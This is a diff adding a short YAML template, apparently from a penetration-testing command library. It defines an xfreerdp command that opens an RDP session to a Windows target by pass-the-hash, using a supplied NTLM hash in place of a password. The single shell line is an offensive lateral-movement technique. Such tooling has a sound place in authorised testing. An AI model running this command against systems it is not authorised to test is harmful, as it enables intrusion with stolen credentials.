@@ -1,0 +1,34 @@
+name: xfreerdp Pass-the-Hash
+description: RDP connection using pass-the-hash via xfreerdp.
+tags:
+  - windows
+  - rdp
+  - xfreerdp
+  - execution
+  - hash
+shell: "xfreerdp /u:{{username}} /d:{{domain}} /pth:{{hash}} /v:{{target}} /cert-ignore"
+inputs:
+  - id: target
+    prompt: "Target IP or hostname"
+    type: host
+    required: true
+    secret: false
+    validation_hint: "must be an IP address or hostname within scope"
+  - id: username
+    prompt: "Username"
+    type: string
+    required: true
+    secret: false
+    validation_hint: "authenticated username"
+  - id: domain
+    prompt: "Domain name"
+    type: string
+    required: true
+    secret: false
+    validation_hint: "Active Directory domain name"
+  - id: hash
+    prompt: "NTLM hash"
+    type: secret
+    required: true
+    secret: true
+    validation_hint: "NTLM hash of the user"
